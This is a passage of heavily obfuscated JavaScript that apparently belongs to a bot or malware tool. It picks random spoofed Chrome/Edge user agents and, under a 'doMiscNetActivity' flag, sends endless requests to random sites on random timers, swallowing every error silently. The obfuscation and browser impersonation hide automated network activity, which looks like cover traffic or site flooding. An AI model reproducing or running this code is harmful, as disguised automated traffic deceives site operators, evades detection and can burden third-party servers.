      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x218b + 0x2 * -0xb00 + -0x3b * -0xf1; k < -0x1bb7 + -0x8 * -0x1a5 + 0x1 * 0xe93; k++)
    setTimeout(f, (0x1b1fb + 0x10bfa + -0x1d395) * k * getRandomInt(-0x1 * -0x23f2 + 0x1f3b + -0x432c, 0x1c1f + 0x55 * 0x17 + 0x23bf * -0x1));
  setInterval(() => {
    f();
    for (let l = 0xd00 + 0x20cc + -0x2dcc; l < 0x19b3 + -0x18b5 + -0xfa; l++)
      setTimeout(f, (-0x2edf + -0x1629d + 0x27bdc) * l * getRandomInt(-0x3b + -0xb60 + 0xb9c, -0x816 + 0x1 * -0x269 + -0x10d * -0xa));
  }, 0x1 * 0x33e33a + -0x3b4a8d + -0x747b * -0x89);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xbb * 0x18 + -0x1804 + -0x2272 * -0x2) * getRandomInt(-0x3b * -0x5c + 0x2ef * -0x5 + 0x13 * -0x58, -0x447 * 0x3 + -0x13 * 0x1d + 0x1 * 0xf01));
}, -0x5f9 * -0x1 + 0x113d + -0x16d2);